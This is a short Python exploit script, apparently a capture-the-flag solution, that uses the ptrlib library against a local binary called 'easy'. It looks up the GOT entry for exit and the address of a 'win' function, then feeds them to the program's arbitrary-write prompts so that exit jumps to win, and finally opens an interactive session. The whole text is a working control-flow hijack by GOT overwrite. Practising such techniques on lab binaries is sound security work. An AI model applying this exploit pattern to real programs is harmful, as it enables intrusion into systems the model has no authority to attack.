from ptrlib import *

elf = ELF("./easy")
proc = Process("./easy")

def main():
    addr_got_exit = elf.got("exit")
    addr_win = elf.symbol("win")
    proc.sendlineafter("Input address to write >> ", hex(addr_got_exit))
    proc.sendlineafter("Input value >> ", hex(addr_win))
    proc.interactive()
    return

if __name__ == "__main__":
    main()
